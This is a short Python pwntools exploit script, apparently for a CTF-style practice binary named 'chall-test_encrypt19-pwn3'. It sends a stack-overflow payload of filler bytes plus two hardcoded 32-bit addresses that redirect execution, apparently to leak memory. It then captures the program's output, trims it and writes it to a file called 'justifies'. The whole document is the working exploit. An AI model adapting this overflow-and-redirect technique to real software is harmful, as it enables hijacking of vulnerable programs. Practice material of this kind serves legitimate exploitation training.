from pwn import *

import sys

target = process("./chall-test_encrypt19-pwn3")
payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8048340)
payload += p32(0x80497b0)
target.sendline(payload)
# Scan in all of the input
foundEnd = False
output = ""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True
# Break up the input by newline characters
outputLines = output.split("\n")
# Early termination if there is no output
if len(outputLines) == 2:
	outputFile = open("justifies", "w")
	outputFile.write("")
	outputFile.close()
	sys.exit(0)
# Parse out the filler output
fillerOutput = outputLines[:-2]
fillerOutput = "\\n".join(fillerOutput)
fillerOutput += "\\n"
# Write it to the output file
outputFile = open("justifies", "w")
outputFile.write(fillerOutput)
outputFile.close()

